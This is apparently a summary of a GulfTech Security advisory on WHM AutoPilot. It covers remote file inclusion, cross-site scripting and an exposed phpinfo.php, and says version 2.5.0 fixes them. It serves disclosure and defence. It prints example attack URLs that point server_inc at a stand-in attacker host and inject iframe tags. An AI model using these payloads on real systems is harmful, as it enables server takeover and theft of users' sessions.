Based on the provided information, here's an analysis of the vulnerabilities in WHM AutoPilot, as reported by GulfTech Security:

**Vulnerabilities:**

1.  **File Include Vulnerability:**
    *   **Root Cause:**  The application uses the `$PHP_SELF` variable to determine which file to include, but this variable can be manipulated by adding extra path information. The application attempts to check for a specific file, like `test.php`, but because of the additional path information, this check is bypassed.  Also, the application is using user-supplied input via GET parameter `server_inc` in include statements.
    *   **Weakness:** Unsanitized user input used in file inclusion.
    *   **Impact:** Remote file inclusion, potentially allowing attackers to execute arbitrary PHP code on the server, leading to complete server compromise.
    *   **Attack Vector:** Manipulating the URL to include malicious remote PHP files via `server_inc` GET parameter, exploiting the flawed check on `$PHP_SELF`.
    *   **Attacker Capability:** No login required, making it accessible to any external attacker.
        *   Examples of vulnerable URLs:
            *   `<http://path/inc/header.php/step_one.php?server_inc=http://attacker/step_one_tables.php>`
            *   `<http://path/inc/step_one_tables.php?server_inc=http://attacker/js_functions.php>`
            *   `<http://path/inc/step_two_tables.php?server_inc=http://attacker/js_functions.php>`

2.  **Cross-Site Scripting (XSS) Vulnerability:**
    *   **Root Cause:**  The application directly outputs user-controlled input into HTML without proper sanitization. This occurs by calling scripts directly and specifying variable values via GET parameters.
    *   **Weakness:** Lack of input sanitization in multiple scripts.
    *   **Impact:** An attacker can inject malicious JavaScript code into the application's pages. This could lead to session hijacking, credential theft, and the execution of arbitrary code in the context of the user's browser.
    *   **Attack Vector:** By manipulating URL query parameters such as `site_title` and `http_images` to inject malicious code.
        *   Examples of vulnerable URLs:
            *   `<http://path/inc/header.php?site_title=%3C/title%3E%3Ciframe%3E>`
            *   `<http://path/admin/themes/blue/header.php?http_images=>'%3E%3Ciframe%3E`

3.  **Information Disclosure:**
    *   **Root Cause:** The application ships with a `phpinfo.php` file, which exposes sensitive server configuration details to the public.
    *   **Weakness:** The presence of a publicly accessible `phpinfo.php` file.
    *   **Impact:** Attackers can gather sensitive information about the server environment, making other attacks easier to execute.
    *   **Attack Vector:** Simply accessing the `/phpinfo.php` file through the web browser.
    *   **Attacker Capability:** Accessible to anyone on the internet.

**Mitigation:**

The provided information indicates that WHM AutoPilot released version 2.5.0 which addresses the above vulnerabilities, which includes:

*   Patching the File Include vulnerabilities by addressing the input sanitization issues and the way `$PHP_SELF` variable is being handled.
*   Sanitizing user inputs to prevent Cross-Site Scripting attacks.
*   Removing the `phpinfo.php` file from the application.

The advisory recommends that users upgrade to v2.5.0 and also delete the `phpinfo.php` file manually.
